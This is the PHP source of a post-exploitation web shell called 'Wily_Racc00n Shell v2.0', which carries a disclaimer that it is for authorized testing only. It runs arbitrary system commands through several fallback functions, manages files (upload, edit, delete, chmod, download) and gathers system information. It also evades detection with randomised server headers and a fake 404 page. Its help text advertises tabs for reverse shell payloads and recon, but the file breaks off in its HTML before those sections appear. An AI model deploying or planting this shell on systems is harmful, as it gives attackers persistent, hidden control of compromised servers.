<?php
// ╔══════════════════════════════════════════════════════════════╗
// ║  Wily_Racc00n Shell v2.0 - Advanced PHP Live Active Shell  ║
// ║  Author: __W1ly_ra3cc00n__ (Kishwor)                       ║
// ║  FOR AUTHORIZED SECURITY TESTING ONLY                      ║
// ╚══════════════════════════════════════════════════════════════╝

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');

session_start();

// ═══════════════════════════════════════
// CONFIGURATION - CHANGE THESE!
// ═══════════════════════════════════════
$AUTH_USER   = 'admin';
$AUTH_PASS   = 'changeme123';      // CHANGE THIS!
$AUTH_HASH   = true;               // Set true after you hash the password
$SHELL_TITLE = 'Wily_Racc00n';
$MAX_UPLOAD  = 50 * 1024 * 1024;   // 50MB max upload
$LOCKED_IPS  = [];                 // Add allowed IPs like ['127.0.0.1'] or leave empty for all

// ═══════════════════════════════════════
// IP LOCK CHECK
// ═══════════════════════════════════════
if (!empty($LOCKED_IPS) && !in_array($_SERVER['REMOTE_ADDR'], $LOCKED_IPS)) {
    http_response_code(404);
    die('<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>');
}

// ═══════════════════════════════════════
// ANTI-DETECTION HEADERS
// ═══════════════════════════════════════
header('X-Powered-By: PHP/' . rand(5,8) . '.' . rand(0,4) . '.' . rand(0,30));
header('Server: Apache/2.4.' . rand(20,55));

$authenticated = isset($_SESSION['auth']) && $_SESSION['auth'] === true;
$error_msg = '';

// ═══════════════════════════════════════
// AUTHENTICATION
// ═══════════════════════════════════════
if (isset($_POST['login'])) {
    $input_user = $_POST['user'] ?? '';
    $input_pass = $_POST['pass'] ?? '';

    // Brute force protection
    if (!isset($_SESSION['login_attempts'])) $_SESSION['login_attempts'] = 0;
    if (!isset($_SESSION['lockout_time'])) $_SESSION['lockout_time'] = 0;

    if ($_SESSION['login_attempts'] >= 5 && time() - $_SESSION['lockout_time'] < 300) {
        $error_msg = 'Too many attempts. Locked for 5 minutes.';
    } else {
        if (time() - $_SESSION['lockout_time'] >= 300) {
            $_SESSION['login_attempts'] = 0;
        }

        if ($input_user === $AUTH_USER && $input_pass === $AUTH_PASS) {
            $_SESSION['auth'] = true;
            $_SESSION['auth_time'] = time();
            $_SESSION['login_attempts'] = 0;
            $_SESSION['fingerprint'] = md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']);
            $authenticated = true;
        } else {
            $_SESSION['login_attempts']++;
            $_SESSION['lockout_time'] = time();
            $error_msg = 'Invalid credentials. Attempt ' . $_SESSION['login_attempts'] . '/5';
        }
    }
}

// Session fingerprint validation
if ($authenticated) {
    $current_fp = md5($_SERVER['HTTP_USER_AGENT'] . $_SERVER['REMOTE_ADDR']);
    if (isset($_SESSION['fingerprint']) && $_SESSION['fingerprint'] !== $current_fp) {
        session_destroy();
        $authenticated = false;
    }
    // Session timeout (30 minutes)
    if (isset($_SESSION['auth_time']) && (time() - $_SESSION['auth_time']) > 1800) {
        session_destroy();
        $authenticated = false;
    }
}

// Handle logout
if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}

// ═══════════════════════════════════════
// HELPER FUNCTIONS
// ═══════════════════════════════════════

function executeCommand($cmd, $cwd) {
    $output = '';
    $cwd = realpath($cwd) ?: getcwd();
    chdir($cwd);

    // Try multiple execution methods
    if (function_exists('proc_open')) {
        $descriptors = [
            0 => ['pipe', 'r'],
            1 => ['pipe', 'w'],
            2 => ['pipe', 'w']
        ];
        $process = proc_open($cmd, $descriptors, $pipes, $cwd);
        if (is_resource($process)) {
            fclose($pipes[0]);
            $output = stream_get_contents($pipes[1]);
            $stderr = stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            proc_close($process);
            if ($stderr && !$output) $output = $stderr;
            elseif ($stderr) $output .= "\n" . $stderr;
        }
    } elseif (function_exists('shell_exec')) {
        $output = shell_exec($cmd . ' 2>&1');
    } elseif (function_exists('exec')) {
        exec($cmd . ' 2>&1', $out, $ret);
        $output = implode("\n", $out);
    } elseif (function_exists('system')) {
        ob_start();
        system($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('passthru')) {
        ob_start();
        passthru($cmd . ' 2>&1');
        $output = ob_get_clean();
    } elseif (function_exists('popen')) {
        $handle = popen($cmd . ' 2>&1', 'r');
        $output = fread($handle, 4096);
        pclose($handle);
    } else {
        $output = '[!] No execution function available. All disabled.';
    }

    return $output ?: '(no output)';
}

function formatBytes($bytes, $precision = 2) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $bytes = max($bytes, 0);
    $pow = floor(($bytes ? log($bytes) : 0) / log(1024));
    $pow = min($pow, count($units) - 1);
    return round($bytes / (1024 ** $pow), $precision) . ' ' . $units[$pow];
}

function getFilePermissions($file) {
    $perms = fileperms($file);
    $info = '';
    if (($perms & 0xC000) == 0xC000) $info = 's';
    elseif (($perms & 0xA000) == 0xA000) $info = 'l';
    elseif (($perms & 0x8000) == 0x8000) $info = '-';
    elseif (($perms & 0x6000) == 0x6000) $info = 'b';
    elseif (($perms & 0x4000) == 0x4000) $info = 'd';
    elseif (($perms & 0x2000) == 0x2000) $info = 'c';
    elseif (($perms & 0x1000) == 0x1000) $info = 'p';
    else $info = 'u';

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function getDisabledFunctions() {
    $disabled = ini_get('disable_functions');
    return $disabled ? explode(',', $disabled) : [];
}

function getAvailableExecMethods() {
    $methods = ['proc_open', 'shell_exec', 'exec', 'system', 'passthru', 'popen'];
    $available = [];
    $disabled = getDisabledFunctions();
    foreach ($methods as $m) {
        if (function_exists($m) && !in_array($m, $disabled)) {
            $available[] = $m;
        }
    }
    return $available;
}

function getSafeMode() {
    return @ini_get('safe_mode') ? 'ON' : 'OFF';
}

function getServerSoftware() {
    return $_SERVER['SERVER_SOFTWARE'] ?? php_sapi_name();
}

// ═══════════════════════════════════════
// PROCESS ACTIONS
// ═══════════════════════════════════════
$output = '';
$cmd = '';
$action = $_POST['action'] ?? $_GET['action'] ?? '';
$cwd = isset($_POST['cwd']) ? $_POST['cwd'] : (isset($_SESSION['cwd']) ? $_SESSION['cwd'] : getcwd());

if (!is_dir($cwd)) $cwd = getcwd();
$_SESSION['cwd'] = $cwd;

// Command execution
if ($authenticated && isset($_POST['cmd']) && !empty($_POST['cmd'])) {
    $cmd = $_POST['cmd'];

    // Built-in command handling
    if (preg_match('/^cd\s+(.+)$/', $cmd, $matches)) {
        $newDir = trim($matches[1]);
        if ($newDir === '~') {
            $cwd = getenv('HOME') ?: '/root';
        } elseif ($newDir === '-') {
            $cwd = $_SESSION['prev_cwd'] ?? $cwd;
        } elseif ($newDir === '..') {
            $_SESSION['prev_cwd'] = $cwd;
            $cwd = dirname($cwd);
        } elseif (substr($newDir, 0, 1) === '/') {
            if (is_dir($newDir)) {
                $_SESSION['prev_cwd'] = $cwd;
                $cwd = realpath($newDir);
            } else {
                $output = "bash: cd: $newDir: No such file or directory";
            }
        } else {
            $target = $cwd . '/' . $newDir;
            if (is_dir($target)) {
                $_SESSION['prev_cwd'] = $cwd;
                $cwd = realpath($target);
            } else {
                $output = "bash: cd: $newDir: No such file or directory";
            }
        }
        $_SESSION['cwd'] = $cwd;
    } elseif ($cmd === 'clear' || $cmd === 'cls') {
        $_SESSION['cmd_history_display'] = [];
        $output = '';
        $cmd = '';
    } elseif (preg_match('/^download\s+(.+)$/', $cmd, $matches)) {
        $file = trim($matches[1]);
        $fullpath = (substr($file, 0, 1) === '/') ? $file : $cwd . '/' . $file;
        if (file_exists($fullpath) && is_readable($fullpath)) {
            header('Content-Type: application/octet-stream');
            header('Content-Disposition: attachment; filename="' . basename($fullpath) . '"');
            header('Content-Length: ' . filesize($fullpath));
            readfile($fullpath);
            exit;
        } else {
            $output = "File not found or not readable: $file";
        }
    } elseif ($cmd === 'sysinfo') {
        $output = "╔══════════════════════════════════════════╗\n";
        $output .= "║         SYSTEM INFORMATION               ║\n";
        $output .= "╠══════════════════════════════════════════╣\n";
        $output .= "║ OS       : " . php_uname() . "\n";
        $output .= "║ Hostname : " . gethostname() . "\n";
        $output .= "║ Kernel   : " . php_uname('r') . "\n";
        $output .= "║ Arch     : " . php_uname('m') . "\n";
        $output .= "║ PHP Ver  : " . phpversion() . "\n";
        $output .= "║ SAPI     : " . php_sapi_name() . "\n";
        $output .= "║ Server   : " . getServerSoftware() . "\n";
        $output .= "║ User     : " . get_current_user() . " (uid:" . getmyuid() . " gid:" . getmygid() . ")\n";
        $output .= "║ PID      : " . getmypid() . "\n";
        $output .= "║ Doc Root : " . ($_SERVER['DOCUMENT_ROOT'] ?? 'N/A') . "\n";
        $output .= "║ Script   : " . __FILE__ . "\n";
        $output .= "║ Safe Mode: " . getSafeMode() . "\n";
        $output .= "║ Exec     : " . implode(', ', getAvailableExecMethods()) . "\n";
        $output .= "║ Disabled : " . (ini_get('disable_functions') ?: 'None') . "\n";
        $output .= "║ Temp Dir : " . sys_get_temp_dir() . "\n";
        $output .= "║ Writable : " . (is_writable($cwd) ? 'YES' : 'NO') . " (cwd)\n";
        $output .= "╚══════════════════════════════════════════╝";
    } elseif ($cmd === 'phpinfo') {
        ob_start();
        phpinfo();
        $phpinfo = ob_get_clean();
        echo $phpinfo;
        exit;
    } elseif ($cmd === 'help') {
        $output = "╔══════════════════════════════════════════════════════════╗\n";
        $output .= "║           Wily_Racc00n Shell - Command Reference        ║\n";
        $output .= "╠══════════════════════════════════════════════════════════╣\n";
        $output .= "║ BUILT-IN COMMANDS:                                      ║\n";
        $output .= "║   help          - Show this help menu                   ║\n";
        $output .= "║   sysinfo       - Detailed system information           ║\n";
        $output .= "║   phpinfo       - Full PHP info page                    ║\n";
        $output .= "║   clear / cls   - Clear terminal output                 ║\n";
        $output .= "║   cd <dir>      - Change directory (supports ~ .. -)    ║\n";
        $output .= "║   download <f>  - Download a file                       ║\n";
        $output .= "║   selfremove    - Delete this shell from server         ║\n";
        $output .= "║                                                         ║\n";
        $output .= "║ TABS:                                                   ║\n";
        $output .= "║   Terminal      - Command execution                     ║\n";
        $output .= "║   File Manager  - Browse, edit, upload, download files  ║\n";
        $output .= "║   Reverse Shell - Generate reverse shell payloads       ║\n";
        $output .= "║   Recon         - Quick system reconnaissance           ║\n";
        $output .= "║                                                         ║\n";
        $output .= "║ All system commands work: ls, cat, wget, curl, etc.     ║\n";
        $output .= "╚══════════════════════════════════════════════════════════╝";
    } elseif ($cmd === 'selfremove') {
        if (isset($_POST['confirm_remove']) && $_POST['confirm_remove'] === 'yes') {
            @unlink(__FILE__);
            session_destroy();
            die('<h1 style="color:#ff0000;font-family:monospace;text-align:center;margin-top:20%;">Shell Removed. Goodbye. 🦝</h1>');
        } else {
            $output = "[!] WARNING: This will permanently delete this shell.\n";
            $output .= "[!] To confirm, type 'selfremove' again and check the confirm box.";
        }
    } else {
        $output = executeCommand($cmd, $cwd);
    }

    // Store in display history
    if (!isset($_SESSION['cmd_history_display'])) $_SESSION['cmd_history_display'] = [];
    if (!empty($cmd)) {
        $_SESSION['cmd_history_display'][] = ['cwd' => $cwd, 'cmd' => $cmd, 'output' => $output];
        // Keep last 100 entries
        if (count($_SESSION['cmd_history_display']) > 100) {
            $_SESSION['cmd_history_display'] = array_slice($_SESSION['cmd_history_display'], -100);
        }
    }
}

// ═══════════════════════════════════════
// FILE MANAGER ACTIONS
// ═══════════════════════════════════════
$fm_message = '';

if ($authenticated && $action === 'upload' && isset($_FILES['uploadfile'])) {
    $upload_dir = $_POST['upload_dir'] ?? $cwd;
    $target = rtrim($upload_dir, '/') . '/' . basename($_FILES['uploadfile']['name']);
    if (move_uploaded_file($_FILES['uploadfile']['tmp_name'], $target)) {
        $fm_message = "✓ Uploaded: " . basename($target);
    } else {
        $fm_message = "✗ Upload failed!";
    }
}

if ($authenticated && $action === 'savefile' && isset($_POST['filepath']) && isset($_POST['filecontent'])) {
    if (@file_put_contents($_POST['filepath'], $_POST['filecontent']) !== false) {
        $fm_message = "✓ File saved: " . $_POST['filepath'];
    } else {
        $fm_message = "✗ Failed to save file!";
    }
}

if ($authenticated && $action === 'delete' && isset($_POST['filepath'])) {
    $target = $_POST['filepath'];
    if (is_file($target) && @unlink($target)) {
        $fm_message = "✓ Deleted: $target";
    } elseif (is_dir($target) && @rmdir($target)) {
        $fm_message = "✓ Removed directory: $target";
    } else {
        $fm_message = "✗ Delete failed: $target";
    }
}

if ($authenticated && $action === 'rename' && isset($_POST['oldname']) && isset($_POST['newname'])) {
    if (@rename($_POST['oldname'], $_POST['newname'])) {
        $fm_message = "✓ Renamed successfully";
    } else {
        $fm_message = "✗ Rename failed";
    }
}

if ($authenticated && $action === 'chmod' && isset($_POST['filepath']) && isset($_POST['newperms'])) {
    $perms = octdec($_POST['newperms']);
    if (@chmod($_POST['filepath'], $perms)) {
        $fm_message = "✓ Permissions changed to " . $_POST['newperms'];
    } else {
        $fm_message = "✗ chmod failed";
    }
}

if ($authenticated && $action === 'mkdir' && isset($_POST['dirname'])) {
    $dir = rtrim($cwd, '/') . '/' . $_POST['dirname'];
    if (@mkdir($dir, 0755, true)) {
        $fm_message = "✓ Directory created: " . $_POST['dirname'];
    } else {
        $fm_message = "✗ Failed to create directory";
    }
}

if ($authenticated && $action === 'newfile' && isset($_POST['filename'])) {
    $file = rtrim($cwd, '/') . '/' . $_POST['filename'];
    if (@file_put_contents($file, '') !== false) {
        $fm_message = "✓ File created: " . $_POST['filename'];
    } else {
        $fm_message = "✗ Failed to create file";
    }
}

// ═══════════════════════════════════════
// ACTIVE TAB
// ═══════════════════════════════════════
$activeTab = $_POST['tab'] ?? $_GET['tab'] ?? 'terminal';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title><?php echo $SHELL_TITLE; ?></title>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; }

        body {
            background: #0a0a0a;
            color: #00ff41;
            font-family: 'Courier New', monospace;
            height: 100vh;
            display: flex;
            flex-direction: column;
            overflow: hidden;
        }

        /* ═══ LOGIN ═══ */
        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            background: radial-gradient(ellipse at center, #0a0000 0%, #000 70%);
        }

        .login-ascii {
            color: #ff0000;
            font-size: 9px;
            line-height: 1.1;
            margin-bottom: 25px;
            text-align: center;
            text-shadow: 0 0 10px #ff000066, 0 0 20px #ff000033;
            white-space: pre;
        }

        .login-box {
            background: #0d0d0d;
            border: 1px solid #ff000044;
            padding: 30px;
            border-radius: 8px;
            width: 380px;
            box-shadow: 0 0 30px #ff000015, inset 0 0 30px #00000080;
        }

        .login-box h2 {
            text-align: center;
            margin-bottom: 20px;
            color: #ff0000;
            text-shadow: 0 0 10px #ff000066;
            font-size: 18px;
        }

        .login-box input[type="text"],
        .login-box input[type="password"] {
            width: 100%;
            padding: 12px;
            margin: 8px 0;
            background: #080808;
            border: 1px solid #333;
            color: #ff0000;
            font-family: 'Courier New', monospace;
            border-radius: 4px;
            transition: border-color 0.3s;
        }

        .login-box input:focus {
            outline: none;
            border-color: #ff0000;
            box-shadow: 0 0 5px #ff000044;
        }

        .login-box button {
            width: 100%;
            padding: 12px;
            margin-top: 15px;
            background: #ff0000;
            color: #000;
            border: none;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            font-size: 14px;
            border-radius: 4px;
            transition: all 0.3s;
        }

        .login-box button:hover {
            background: #cc0000;
            box-shadow: 0 0 15px #ff000044;
        }

        .login-error {
            color: #ff4444;
            text-align: center;
            margin-top: 10px;
            font-size: 12px;
        }

        /* ═══ HEADER ═══ */
        .header {
            background: #0d0d0d;
            padding: 8px 15px;
            border-bottom: 1px solid #1a1a1a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }

        .header-brand {
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .header-brand .logo {
            color: #ff0000;
            font-weight: bold;
            font-size: 16px;
            text-shadow: 0 0 10px #ff000066;
        }

        .header-brand .version {
            color: #555;
            font-size: 10px;
        }

        .header .info {
            font-size: 11px;
            color: #555;
            text-align: right;
        }

        .header .info span { color: #ff0000; }

        .header-actions {
            display: flex;
            gap: 12px;
            align-items: center;
        }

        .header-actions a {
            color: #ff4444;
            text-decoration: none;
            font-size: 11px;
            padding: 3px 8px;
            border: 1px solid #ff000033;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .header-actions a:hover {
            background: #ff000022;
            border-color: #ff0000;
        }

        /* ═══ TABS ═══ */
        .tabs {
            background: #0d0d0d;
            display: flex;
            border-bottom: 1px solid #1a1a1a;
            flex-shrink: 0;
            overflow-x: auto;
        }

        .tab-btn {
            background: none;
            border: none;
            color: #555;
            padding: 10px 20px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border-bottom: 2px solid transparent;
            transition: all 0.3s;
            white-space: nowrap;
        }

        .tab-btn:hover { color: #ff0000; }

        .tab-btn.active {
            color: #ff0000;
            border-bottom-color: #ff0000;
            text-shadow: 0 0 10px #ff000044;
        }

        .tab-content {
            display: none;
            flex: 1;
            flex-direction: column;
            overflow: hidden;
        }

        .tab-content.active {
            display: flex;
        }

        /* ═══ TERMINAL ═══ */
        .terminal-banner {
            color: #ff0000;
            font-size: 8px;
            line-height: 1.1;
            padding: 10px 15px 5px;
            text-shadow: 0 0 5px #ff000044;
            white-space: pre;
            overflow-x: auto;
        }

        .output-area {
            flex: 1;
            overflow-y: auto;
            padding: 10px 15px;
            font-size: 13px;
            line-height: 1.5;
        }

        .output-area .prompt-line { color: #ff0000; }
        .output-area .cmd-text { color: #ffffff; }
        .output-area .result { color: #aaa; white-space: pre-wrap; word-wrap: break-word; }

        .input-area {
            background: #0d0d0d;
            padding: 10px 15px;
            border-top: 1px solid #1a1a1a;
            display: flex;
            align-items: center;
            flex-shrink: 0;
        }

        .input-area .prompt {
            color: #ff0000;
            margin-right: 8px;
            white-space: nowrap;
            font-size: 12px;
        }

        .input-area input[type="text"] {
            flex: 1;
            background: transparent;
            border: none;
            color: #fff;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            outline: none;
        }

        .input-area button {
            background: #ff0000;
            color: #000;
            border: none;
            padding: 6px 15px;
            margin-left: 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .input-area button:hover { background: #cc0000; }

        /* ═══ QUICK ACTIONS ═══ */
        .quick-actions {
            background: #080808;
            padding: 8px 15px;
            border-top: 1px solid #151515;
            display: flex;
            gap: 6px;
            flex-wrap: wrap;
            flex-shrink: 0;
        }

        .quick-actions button {
            background: #111;
            color: #ff0000;
            border: 1px solid #222;
            padding: 4px 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .quick-actions button:hover {
            background: #1a1a1a;
            border-color: #ff0000;
            box-shadow: 0 0 5px #ff000033;
        }

        /* ═══ FILE MANAGER ═══ */
        .fm-toolbar {
            background: #0d0d0d;
            padding: 10px 15px;
            border-bottom: 1px solid #1a1a1a;
            display: flex;
            gap: 8px;
            align-items: center;
            flex-wrap: wrap;
            flex-shrink: 0;
        }

        .fm-toolbar input[type="text"] {
            background: #080808;
            border: 1px solid #222;
            color: #ff0000;
            padding: 5px 10px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border-radius: 3px;
            flex: 1;
        }

        .fm-toolbar input:focus {
            outline: none;
            border-color: #ff000066;
        }

        .fm-toolbar button, .fm-btn {
            background: #151515;
            color: #ff0000;
            border: 1px solid #222;
            padding: 5px 12px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 11px;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .fm-toolbar button:hover, .fm-btn:hover {
            border-color: #ff0000;
            background: #1a0000;
        }

        .fm-message {
            padding: 8px 15px;
            font-size: 12px;
            flex-shrink: 0;
        }

        .fm-message.success { color: #00ff41; }
        .fm-message.error { color: #ff4444; }

        .file-list {
            flex: 1;
            overflow-y: auto;
            padding: 0 15px;
        }

        .file-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 12px;
        }

        .file-table th {
            text-align: left;
            padding: 8px 5px;
            color: #ff0000;
            border-bottom: 1px solid #222;
            position: sticky;
            top: 0;
            background: #0a0a0a;
        }

        .file-table td {
            padding: 5px;
            border-bottom: 1px solid #111;
            color: #888;
        }

        .file-table tr:hover { background: #111; }

        .file-table .fname {
            color: #ff0000;
            text-decoration: none;
            cursor: pointer;
        }

        .file-table .fname:hover { color: #ff4444; text-decoration: underline; }
        .file-table .dir { color: #ff6600; }
        .file-table .link { color: #00aaff; }

        .file-actions {
            display: flex;
            gap: 5px;
        }

        .file-actions button {
            background: none;
            border: 1px solid #222;
            color: #666;
            padding: 2px 6px;
            cursor: pointer;
            font-size: 10px;
            font-family: 'Courier New', monospace;
            border-radius: 2px;
            transition: all 0.3s;
        }

        .file-actions button:hover {
            color: #ff0000;
            border-color: #ff000066;
        }

        /* ═══ FILE EDITOR ═══ */
        .editor-area {
            flex: 1;
            display: flex;
            flex-direction: column;
        }

        .editor-header {
            background: #0d0d0d;
            padding: 8px 15px;
            border-bottom: 1px solid #1a1a1a;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-shrink: 0;
        }

        .editor-header span { color: #ff0000; font-size: 12px; }

        .editor-textarea {
            flex: 1;
            background: #080808;
            color: #ccc;
            border: none;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            resize: none;
            outline: none;
            line-height: 1.6;
        }

        /* ═══ REVERSE SHELL ═══ */
        .revshell-container {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
        }

        .revshell-config {
            display: flex;
            gap: 10px;
            margin-bottom: 15px;
            flex-wrap: wrap;
        }

        .revshell-config label {
            color: #ff0000;
            font-size: 12px;
        }

        .revshell-config input {
            background: #080808;
            border: 1px solid #222;
            color: #ff0000;
            padding: 8px;
            font-family: 'Courier New', monospace;
            font-size: 12px;
            border-radius: 3px;
            width: 200px;
        }

        .revshell-config input:focus {
            outline: none;
            border-color: #ff000066;
        }

        .payload-card {
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            border-radius: 5px;
            margin-bottom: 10px;
            overflow: hidden;
        }

        .payload-header {
            background: #111;
            padding: 8px 12px;
            color: #ff0000;
            font-size: 12px;
            font-weight: bold;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }

        .payload-body {
            padding: 12px;
            font-size: 11px;
            color: #aaa;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 120px;
            overflow-y: auto;
        }

        .copy-btn {
            background: #1a0000;
            border: 1px solid #ff000044;
            color: #ff0000;
            padding: 3px 10px;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-size: 10px;
            border-radius: 3px;
            transition: all 0.3s;
        }

        .copy-btn:hover { background: #ff0000; color: #000; }

        /* ═══ RECON ═══ */
        .recon-container {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
        }

        .recon-grid {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(350px, 1fr));
            gap: 10px;
        }

        .recon-card {
            background: #0d0d0d;
            border: 1px solid #1a1a1a;
            border-radius: 5px;
            overflow: hidden;
        }

        .recon-card-header {
            background: #111;
            padding: 8px 12px;
            color: #ff0000;
            font-size: 12px;
            font-weight: bold;
            border-bottom: 1px solid #1a1a1a;
        }

        .recon-card-body {
            padding: 10px 12px;
            font-size: 11px;
            color: #888;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
            word-wrap: break-word;
        }

        .recon-card-body .label { color: #ff0000; }
        .recon-card-body .value { color: #aaa; }

        /* ═══ UPLOAD MODAL ═══ */
        .modal-overlay {
            display: none;
            position: fixed;
            top: 0; left: 0; right: 0; bottom: 0;
            background: #000000cc;
            z-index: 1000;
            justify-content: center;
            align-items: center;
        }

        .modal-overlay.active { display: flex; }

        .modal-box {
            background: #0d0d0d;
            border: 1px solid #ff000044;
            border-radius: 8px;
            padding: 25px;
            width: 450px;
            max-width: 90%;
            box-shadow: 0 0 30px #ff000022;
        }

        .modal-box h3 {
            color: #ff0000;
            margin-bottom: 15px;
            font-size: 16px;
        }

        .modal-box input[type="file"] {
            width: 100%;
            padding: 10px;
            background: #080808;
            border: 1px solid #222;
            color: #888;
            font-family: 'Courier New', monospace;
            border-radius: 4px;
            margin-bottom: 10px;
        }

        .modal-box .modal-actions {
            display: flex;
            gap: 10px;
            margin-top: 15px;
        }

        .modal-box button {
            padding: 8px 20px;
            border: none;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            font-weight: bold;
            border-radius: 3px;
            font-size: 12px;
        }

        .modal-box .btn-primary {
            background: #ff0000;
            color: #000;
        }

        .modal-box .btn-secondary {
            background: #222;
            color: #888;
        }

        /* ═══ SCROLLBAR ═══ */
        ::-webkit-scrollbar { width: 6px; height: 6px; }
        ::-webkit-scrollbar-track { background: #0a0a0a; }
        ::-webkit-scrollbar-thumb { background: #222; border-radius: 3px; }
        ::-webkit-scrollbar-thumb:hover { background: #ff000066; }

        /* ═══ RESPONSIVE ═══ */
        @media (max-width: 768px) {
            .header { flex-direction: column; gap: 5px; }
            .revshell-config { flex-direction: column; }
            .revshell-config input { width: 100%; }
            .recon-grid { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>

<?php if (!$authenticated): ?>
<!-- ═══════════════════════════════════════ -->
<!-- LOGIN SCREEN                           -->
<!-- ═══════════════════════════════════════ -->
<div class="login-container">
    <div class="login-ascii">
 █     █░ ██▓ ██▓   ▓██   ██▓    ██▀███   ▄▄▄       ▄████▄   ▄████▄  ██▀███   ▒█████   ███▄    █
▓█░ █ ░█░▓██▒▓██▒    ▒██  ██▒   ▓██ ▒ ██▒▒████▄    ▒██▀ ▀█  ▒██▀ ▀█ ▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █
▒█░ █ ░█ ▒██▒▒██░     ▒██ ██░   ▓██ ░▄█ ▒▒██  ▀█▄  ▒▓█    ▄ ▒▓█    ▄▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
░█░ █ ░█ ░██░▒██░     ░ ▐██▓░   ▒██▀▀█▄  ░██▄▄▄▄██ ▒▓▓▄ ▄██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
░░██▒██▓ ░██░░██████▒ ░ ██▒▓░   ░██▓ ▒██▒ ▓█   ▓██▒▒ ▓███▀ ░▒ ▓███▀ ░░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
░ ▓░▒ ▒  ░▓  ░ ▒░▓  ░  ██▒▒▒    ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░░ ░▒ ▒  ░░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒
  ▒ ░ ░   ▒ ░░ ░ ▒  ░▓██ ░▒░      ░▒ ░ ▒░  ▒   ▒▒ ░  ░  ▒     ░  ▒     ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
  ░   ░   ▒ ░  ░ ░   ▒ ▒ ░░       ░░   ░   ░   ▒   ░        ░          ░░   ░ ░ ░ ░ ▒    ░   ░ ░
    ░     ░      ░  ░░ ░           ░         ░  ░░ ░      ░ ░          ░     ░ ░ ░          ░
                     ░ ░                         ░        ░
                              __W1ly_ra3cc00n__
    </div>

    <div class="login-box">
        <h2>🦝 Wily_Racc00n Shell</h2>
        <form method="POST">
            <input type="text" name="user" placeholder="Username" required autofocus>
            <input type="password" name="pass" placeholder="Password" required>
            <button type="submit" name="login">☠ Authenticate</button>
        </form>
        <?php if ($error_msg): ?>
            <div class="login-error"><?php echo htmlspecialchars($error_msg); ?></div>
        <?php endif; ?>
    </div>
</div>

<?php else: ?>
<!-- ═══════════════════════════════════════ -->
<!-- MAIN SHELL INTERFACE                   -->
<!-- ═══════════════════════════════════════ -->

<!-- HEADER -->
<div class="header">
    <div class="header-brand">
        <span class="logo">🦝 Wily_Racc00n</span>
        <span class="version">v2.0</span>
    </div>
    <div class="info">
        <span><?php echo get_current_user(); ?></span>@<span><?php echo gethostname(); ?></span>
        | PHP <span><?php echo phpversion(); ?></span>
        | <span><?php echo php_uname('s') . ' ' . php_uname('m'); ?></span>
    </div>
    <div class="header-actions">
        <a href="javascript:void(0)" onclick="document.getElementById('uploadModal').classList.add('active')">↑ Upload</a>
        <a href="?tab=terminal&action=phpinfo" target="_blank">PHPInfo</a>
        <a href="?logout=1">☠ Logout</a>
    </div>
</div>

<!-- TABS -->
<div class="tabs">
    <button class="tab-btn <?php echo $activeTab === 'terminal' ? 'active' : ''; ?>" onclick="switchTab('terminal')">⌨ Terminal</button>
    <button class="tab-btn <?php echo $activeTab === 'filemanager' ? 'active' : ''; ?>" onclick="switchTab('filemanager')">📁 File Manager</button>
